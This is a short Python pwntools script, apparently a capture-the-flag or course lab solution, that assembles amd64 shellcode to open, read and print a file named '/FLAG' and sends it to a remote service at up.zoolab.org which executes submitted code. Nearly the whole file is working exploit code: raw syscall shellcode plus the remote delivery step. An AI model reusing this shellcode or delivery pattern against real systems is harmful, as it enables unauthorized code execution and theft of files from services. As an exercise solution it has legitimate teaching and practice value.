from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'

# exe = './shellcode'
port = 12341

# elf = ELF(exe)
# off_main = elf.symbols[b'main']
# base = 0
# qemu_base = 0

shellcode = asm("""
    xor rax, rax
    mov rbx, 0x47414c462f  # "/FLAG"
    push rbx
    mov rdi, rsp           # file name
    xor rsi, rsi           # O_RDONLY
    mov rax, 2             # syscall - open
    syscall

    mov rdi, rax           # file descriptor
    mov rsi, rsp           # buffer 
    mov rdx, 0x100         # count - read length
    xor rax, rax           # syscall - read
    syscall
                
    mov rdx, rax           # get number of bytes read
    mov rdi, 1             # stdout
    mov rax, 1             # syscall - write
    syscall

    mov rax, 60            # syscall - exit
    xor rdi, rdi
    syscall
""")


r = remote('up.zoolab.org', port)

r.recvuntil(b"Enter your code> ")
r.send(shellcode)
r.interactive()
